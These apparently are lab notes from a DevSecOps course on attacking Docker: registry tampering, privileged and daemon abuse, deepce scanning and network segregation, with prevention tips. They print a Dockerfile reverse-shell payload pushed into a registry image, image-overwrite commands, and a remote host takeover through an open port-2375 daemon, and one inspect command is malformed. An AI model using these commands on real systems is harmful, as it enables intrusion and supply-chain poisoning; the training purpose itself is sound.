# Attacking Containers and Containerized Apps

### Building Secure Container Images
• Choose smaller Base Images. \
• Lint Dockerfile and follow best practices to catch any issues \
• Centos, Debian or Ubuntu can't be avoided for special cases like ELK\
• Use Distroless Docker images:
1. Contains only application and its runtime dependencies without the bloat (package managers, shells etc.,).
2. Also reduces supply chain attacks using cosign

We can search for official images using the “is-official=true” filter on the docker hub. \
``docker search --filter=is-official=true nginx``

You can check the history of an image using the following command to see what commands were used during the image creation. \
``docker history --no-trunc -H --format="{{.CreatedAt}} | {{.CreatedBy}}" hysnsec/django.nv``

> ClamAV can be used to scan containers for malware and vulnerabilities.


### Insecure Docker Registry

``docker run -d --name registry -p 80:5000 --restart=always registry:2.7.1``

Unless explicitly configured, public registries does not need authentication using the ***docker login*** command.

```
***Remember***
Organizations must be careful in managing their container images, as they may contain vulnerabilities or be infected with malware. An unauthorized user with access to push, pull or update container images can cause severe damage by introducing malicious images or stealing sensitive data using reverse engineering. Performing any unauthorized actions on the container registry can lead to a supply chain attack, a type of cyberattack where an attacker targets a software vendor’s third-party suppliers, compromising their platform or software and granting access to the vendor’s network, thus exploiting any weakness in their security measures.
```

***Payload to gain reverse shell access*** \
``export IP_ADDR=$(ifconfig eth0 | awk 'NR==2 {print $2}')``
```
cat > Dockerfile <<EOF
FROM devsecops-box-1i63nn7i.lab.practical-devsecops.training/django.nv

CMD ["/bin/bash", "-c", "bash -i >& /dev/tcp/$IP_ADDR/8484 0>&1"]
EOF

```

List all images in the registry. \
``curl https://devsecops-box-1i63nn7i.lab.practical-devsecops.training/v2/_catalog`` 

Check the tags for image. \
``curl https://devsecops-box-1i63nn7i.lab.practical-devsecops.training/v2/django.nv/tags/list`` 

Check each layers of image. \
``curl https://devsecops-box-1i63nn7i.lab.practical-devsecops.training/v2/django.nv/manifests/1.0``

Now, let’s replace the existing image with another image. \
``docker pull nginx``

Rename the nginx image to the target image. \
``docker tag nginx devsecops-box-1i63nn7i.lab.practical-devsecops.training/django.nv:1.0``

Then, pushing to the registry. \
``docker push devsecops-box-1i63nn7i.lab.practical-devsecops.training/django.nv:1.0``

---

#### Exploiting shared namespaces
• Sharing Namespaces with host is typically a bad idea \
• Host's Network Sharing allows you to entirely disable the isolation at network layer \
• Similarly sharing pid namespace with host removes process isolation

---

#### Manipulating the Privileged mode containers
• Privileged flag disables all the safeguards and isolations provided by the Docker \
• Allows an attacker to escalate privileges and exploit the host machine \
• We can mount the host's filesystem inside the container and read/write/update files

Finding --privileged Containers \
``$ docker ps --quiet --all | xargs docker inspect --format '{{ .Id }}:
Privileged={{ HostConfig Privileged``

---

#### Docker Daemon Attack
• By default, docker daemon uses the the unix socket docker.sock that listens locally \
• Docker daemon can be configured to accept external requests:
1.  Default TCP port is 2375
2.  Default TLS port is 2376 

• By default, docker daemon's API works without authentication \
• Access to docker daemon's API could result in a complete system compromise

---

### DOS Attacks
• The default behavior of the docker allows a malicious/misbehaving container to consume all the available resources in the system. \
• This can lead to the denial of service (DOS) attacks and can even crash the system entirely, taking down the other containers with it.

---

### Unsecured Docker Daemon

An attacker can use many resources to exploit remote hosts, i.e., [GTFOBins](https://gtfobins.github.io/#docker) is one of the most famous references. You can search any binary applications to know how to legitimate it into high-level access.


-> To get shell \
``docker run -v /:/mnt --rm -it alpine chroot /mnt sh``

-> To get shell of remote host \
``docker -H prod-0x3qnu8a:2375 run -v /:/mnt --rm -it alpine chroot /mnt sh``


***Here are a few key points about the steps that we did from the beginning:***

1. Found unauthenticated Docker API in the remote host
2. Use bind mount volume to get access into the host filesystem
3. chroot command to switch the root directory of container to the mapped volume which mounts / to /mnt
4. Getting full access to remote host filesystem inside the container that we run using docker run

***How to Prevent***
1. Don’t expose the Docker daemon socket to the internet without authentication, authorization, or another approach to protecting the application from the attacker. If you use Docker, you would need to use SSH or TLS as authentication
2. Restrict several commands in the container using Seccomp, AppArmor feature or remove unnecessary packages
3. Follow Principle of least priviledges and use low privileged user when running container. This can stop privilege escalation attack
4. Whitelist access to the Docker socket if you need it to be accessed by other internal application
5. Monitor your container activity to block malicious commands

---

### Exploiting Containerized Apps

We can identify security issues in this application when we scan it using OWASP ZAP. \
``docker run --rm softwaresecurityproject/zap-stable:2.14.0 zap-baseline.py -t https://sandbox-0x3qnu8a-8000.lab.practical-devsecops.training``


-> To listen incoming connections \
``apt install -y netcat`` \
``nc -lp 4242``

---

### Docker Exploitation using deepce

> Docker Enumeration, Escalation of Privileges, and Container Escapes (DEEPCE) is an open-source tool written using a Bash script and designed to automate the exploitation process in Docker containers for pentesters, hackers, and developers also can help you identify vulnerabilities and misconfigurations in your Docker environment.

Let’s download the deepce tool. \
``curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o /usr/local/bin/deepce.sh``

Give executable permission to the deepce binary. \
``chmod +x /usr/local/bin/deepce.sh``

 we are going to use an automated script to help us assess our environment that has Docker installed.

Let’s run the scanner \
``deepce.sh -e DOCKER``


> To prevent container breakout exploitation, it is important to properly secure bind mounts and restrict access to the host system from within the container. This can be done by using the --read-only and --tmpfs flags when mounting sensitive directories, and by using Docker's built-in security features such as SELinux and AppArmor to restrict container access to the host system. Additionally, it is important to regularly update Docker and container images to ensure that known vulnerabilities are patched.

---

### Network Segregation in Containerized Apps

#### Choosing the Right Network Mode
Docker offers several network modes. The appropriate mode for a microservices app depends on the architecture and service interactions. For example, in a scenario with Product A consisting of over ten microservices, not all services need to communicate. To secure the network, the operations team should understand each service's requirements to define effective network segregation policies.

#### Bridge Network Driver
Containers using the default bridge network can communicate with the host machine, similar to devices on a LAN, which can be vulnerable to attacks like ARP spoofing. To enhance security, disable inter-container communication (`icc`) and use the `--link` option for secure communication between containers.

#### Host Network Driver
In host network mode, containers share the host's network stack. This provides direct access to the host's services but poses a risk, as changes to the host’s network configuration can impact running applications. This mode is suitable for cases where direct attachment to the host network is needed.

#### Key Takeaways
Network rules are crucial for securing containerized applications in environments like Docker and Kubernetes. Proper configuration ensures secure inter-service communication and prevents potential security breaches.

[More on Docker network links](https://docs.docker.com/network/links/#communication-across-links)  
[Docker Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html#rule-5-disable-inter-container-communication-iccfalse)  
[OWASP Threats in Docker Security](https://github.com/OWASP/Docker-Security/blob/main/001%20-%20Threats.md)  
[OWASP Network Segmentation and Firewalling](https://github.com/OWASP/Docker-Security/blob/main/D03%20-%20Network%20Segmentation%20and%20Firewalling.md)  
[Container Journal: Latest Docker Container Attack](https://containerjournal.com/topics/container-security/latest-docker-container-attack-highlights-remote-networking-flaws)
